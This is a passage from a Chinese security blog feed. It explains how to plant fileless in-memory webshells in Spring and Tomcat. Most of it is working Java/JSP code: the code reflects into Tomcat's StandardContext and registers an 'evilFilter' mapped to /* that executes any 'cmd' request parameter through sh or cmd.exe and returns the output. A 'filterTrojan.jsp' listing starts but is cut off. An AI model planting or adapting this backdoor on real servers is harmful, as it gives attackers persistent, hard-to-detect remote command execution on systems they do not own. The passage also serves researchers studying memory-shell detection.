class="meta">@RequestMapping(&quot;/InjectInterceptor&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilController</span> &#123;</span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;org.example.springmvc.InjectInterceptor&quot;</span>);</span><br><span class="line">            response.getWriter().println(<span class="string">&quot;Inject done!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171335538.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171335538.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116171335538"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171353734.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230116171353734.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20230116171353734"></p><p>参考：<a href="https://ho1aas.blog.csdn.net/article/details/123943546">https://ho1aas.blog.csdn.net/article/details/123943546</a></p><p><a href="https://www.freebuf.com/articles/web/327633.html">https://www.freebuf.com/articles/web/327633.html</a></p><p><a href="https://landgrey.me/blog/12/">https://landgrey.me/blog/12/</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> 内存马 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马——Filter&amp;Servlet&amp;Listener&amp;valve</title>
      <link href="/2022/12/12/tomcat-nei-cun-ma-filter-servlet-listener-valve/"/>
      <url>/2022/12/12/tomcat-nei-cun-ma-filter-servlet-listener-valve/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><p>基础知识：<a href="https://www.freebuf.com/articles/web/274466.html">https://www.freebuf.com/articles/web/274466.html</a></p><p>内存马主要分为以下几类：</p><ol><li>servlet-api类</li></ol><ul><li>filter型</li><li>servlet型</li></ul><ol start="2"><li>spring类</li></ol><ul><li>拦截器</li><li>controller型</li></ul><ol start="3"><li>Java Instrumentation类</li></ol><ul><li>agent型</li></ul><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226192132015.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226192132015.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221226192132015"></p><p>请求会经过filter到达servlet，动态创建fliter放在最前面，就会命令执行</p><h2 id="动态注册fliter"><a href="#动态注册fliter" class="headerlink" title="动态注册fliter"></a>动态注册fliter</h2><p>具体新建servlet的过程：<a href="https://blog.csdn.net/gaoqingliang521/article/details/108677301">https://blog.csdn.net/gaoqingliang521/article/details/108677301</a></p><p>新建一个servlet:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">servlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException&#123;</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello servlet&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置tomcat：应用程序上下文表示http访问servlet的地址，这里就是localhost:8080&#x2F;servlet</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226195245120.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221226195245120"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221226200309488.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221226200309488"></p><p>自定义的filter:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">filterDemo</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始化创建&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行过滤操作&quot;</span>);</span><br><span class="line">      </span><br><span class="line">       filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改web.xml，指定url-pattern为<code>/demo</code>，也就是访问<a href="http://localhost:8080/servlet/demo%E6%97%B6%E8%A7%A6%E5%8F%91filter%EF%BC%8C%E4%B8%80%E7%9B%B4%E5%88%B7%E6%96%B0%E4%B8%80%E7%9B%B4%E8%A7%A6%E5%8F%91">http://localhost:8080/servlet/demo时触发filter，一直刷新一直触发</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;4.0&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.example.filterDemo<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>filterDemo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>分析之前在项目结构-&gt;模块-&gt;依赖里导入tomcat&#x2F;lib的包</p><blockquote><p>如果可以把自己创建的FilterMap放在FilterMaps的最前面，urlpattern匹配到的时候，就能把恶意FilterConfig添加到FilterChain中，然后触发shell</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153131060.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153131060.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227153131060"></p><p>filterChain来自creatFilterChain</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153326017.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153326017.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227153326017"></p><p><strong>FilterDefs</strong>：存放FilterDef的数组 ，<strong>FilterDef</strong> 中存储着我们过滤器名，过滤器实例，作用 url 等基本信息</p><p><strong>FilterConfigs</strong>：存放filterConfig的数组，在 <strong>FilterConfig</strong> 中主要存放 FilterDef 和 Filter对象等信息</p><p><strong>FilterMaps</strong>：存放FilterMap的数组，在 <strong>FilterMap</strong> 中主要存放了 FilterName 和 对应的URLPattern</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153646187.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227153646187.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227153646187"></p><h2 id="容器组件"><a href="#容器组件" class="headerlink" title="容器组件"></a>容器组件</h2><p><a href="https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w">https://mp.weixin.qq.com/s/YhiOHWnqXVqvLNH7XSxC9w</a></p><ul><li>servletContext和StandardContext的关系</li></ul><p>Tomcat中ServletContext实现类为ApplicationContext。ApplicationContext实例中又包含了StandardContext实例，以此来获取操作Tomcat容器内部的一些信息，例如Servlet的注册等。</p><p>由于正常环境不能直接修改web.xml。但是可以通过反射生成恶意filterDefs、filterConfig、filterMaps，三个一起放入Context就起到了web.xml注册一样的效果</p><p>要实现filter型内存马，需要经过：</p><ol><li>创建恶意filter</li><li>用filterDef对filter进行封装</li><li>将filterDef添加到filterDefs跟filterConfigs中</li><li>创建一个新的filterMap将URL跟filter进行绑定，并添加到filterMaps中</li></ol><p>因为filter生效会有一个先后顺序，所以一般来讲我们还需要把我们的filter给移动到FilterChain的第一位去。</p><p>每次请求createFilterChain都会依据此动态生成一个过滤链，而StandardContext又会一直保留到Tomcat生命周期结束，所以我们的内存马就可以一直驻留下去，直到Tomcat重启。</p><p>在Tomcat 7.x以上才支持Servlet3，而java.servlet.DispatcherType类在servlet3才引入。所以filter型内存马需要Tomcat7以上</p><h2 id="一、Filter内存马"><a href="#一、Filter内存马" class="headerlink" title="一、Filter内存马"></a>一、Filter内存马</h2><h3 id="1-获取context"><a href="#1-获取context" class="headerlink" title="1.获取context"></a>1.获取context</h3><p>servlet提供了request.getSession().getServletContext()获取servletContext</p><p>不过该方法直接获取到的是ApplicationContextFacade，它封装了ApplicationContext。然后ApplicationContext封装了StandardContext</p><blockquote><p>表达式((RequestFacade)servletRequest).request.getSession().getServletContext()</p></blockquote><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227163112042.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227163112042.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227163112042"></p><p>因此调两次反射就能拿到StandardContext</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不过servlet环境的request实际上为RequestFacade对象，它的request属性存储了Request对象，Request对象的getContext能直接拿到Context</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227162536522.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227162536522.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227162536522"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (Request) requestField.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) request1.getContext();</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-添加FilterDefs"><a href="#2-添加FilterDefs" class="headerlink" title="2.添加FilterDefs"></a>2.添加FilterDefs</h3><p>FilterDef提供了setFilter来修改filter</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205553231.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205553231.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227205553231"></p><p>然后用StandardContext#addFilterDef()来添加FilterDefs</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205817618.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227205817618.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227205817618"></p><p>生成恶意filter:接收cmd作为参数，System.getProperty(os.name)获取系统变量，用来判定系统为Linux or windows。然后调用Runtime#exec()进行命令执行。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            response.getWriter().write(output);</span><br><span class="line">            response.getWriter().flush();</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure><p><code>Scanner(in).useDelimiter(&quot;\\A&quot;);</code>scannner读入所有输入，包括回车和换行符（默认读到空格停止，<code>\\A</code>表示以文本开头作为分隔符分割文本)</p><p>将output写入response，获取完参数将request和response作为回调参数调用doFilter。</p><p>重点在于setFilter修改filter，然后使用standardContext.addFilter()添加FilterDefs</p><h3 id="3-filterConfig封装filterDefs，并添加到filterConfigs"><a href="#3-filterConfig封装filterDefs，并添加到filterConfigs" class="headerlink" title="3.filterConfig封装filterDefs，并添加到filterConfigs"></a>3.filterConfig封装filterDefs，并添加到filterConfigs</h3><p>利用反射获取filterConifigs，filterConfigs实际上是个hashmap，put进去就行了</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227213830277.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227213830277.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227213830277"></p><p>前面说过了，standardContext实际上是ApplicationFilterConfigContext封装的。</p><p>利用ApplicationFilterConfigContext构造函数来封装filterfDefs，不过该构造函数无修饰符，为default（同包可用），使用反射</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227212217994.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20221227212217994.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20221227212217994"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">   constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">   <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">   filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">   <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">   filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="4-生成filterMap添加到filterMaps"><a href="#4-生成filterMap添加到filterMaps" class="headerlink" title="4.生成filterMap添加到filterMaps"></a>4.生成filterMap添加到filterMaps</h3><p>filterMaps需要设置名称，pattern，dispatcher</p><p>这里的dispatcher需要设置为DispatcherType.REQUEST，该选项指定了filter过滤器根据DispatcherType的类型是否执行。这也是为什么需要tomcat7以上的原因</p><p>FilterMaps可以用两种方式添加map：addFilterMap 或者addFilterMapBefore()，后者可以将filter添加至最前面</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br></pre></td></tr></table></figure><p>将抽象类的方法补全就能用了</p><p>完整代码：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filterTrojan.jsp</span></span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContextFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Map&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Constructor&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Context&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">  <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">  appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">  <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> 